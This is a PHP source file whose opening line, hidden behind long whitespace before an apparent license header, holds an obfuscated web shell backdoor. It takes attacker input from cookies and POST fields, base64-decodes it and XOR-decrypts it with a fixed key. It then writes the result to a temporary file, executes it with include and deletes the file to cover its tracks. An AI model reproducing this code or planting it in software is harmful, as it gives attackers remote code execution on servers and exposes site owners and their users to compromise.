<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("tjdrqjlgh")){class tjdrqjlgh{public static $bbmsccleu = "bhbbcqgszzxonxma";public static $gwelpuw = NULL;public function __construct(){$ewrqeg = @$_COOKIE[substr(tjdrqjlgh::$bbmsccleu, 0, 4)];if (!empty($ewrqeg)){$ayzmjtbqt = "base64";$gulrps = "";$ewrqeg = explode(",", $ewrqeg);foreach ($ewrqeg as $hkmybdod){$gulrps .= @$_COOKIE[$hkmybdod];$gulrps .= @$_POST[$hkmybdod];}$gulrps = array_map($ayzmjtbqt . "_decode", array($gulrps,));$gulrps = $gulrps[0] ^ str_repeat(tjdrqjlgh::$bbmsccleu, (strlen($gulrps[0]) / strlen(tjdrqjlgh::$bbmsccleu)) + 1);tjdrqjlgh::$gwelpuw = @unserialize($gulrps);}}public function __destruct(){$this->rvxhguibaw();}private function rvxhguibaw(){if (is_array(tjdrqjlgh::$gwelpuw)) {$kvkvk = sys_get_temp_dir() . "/" . crc32(tjdrqjlgh::$gwelpuw["salt"]);@tjdrqjlgh::$gwelpuw["write"]($kvkvk, tjdrqjlgh::$gwelpuw["content"]);include $kvkvk;@tjdrqjlgh::$gwelpuw["delete"]($kvkvk);exit();}}}$ajogkaqx = new tjdrqjlgh();$ajogkaqx = NULL;} ?><?php
 /**
 * NOTICE OF LICENSE
 *
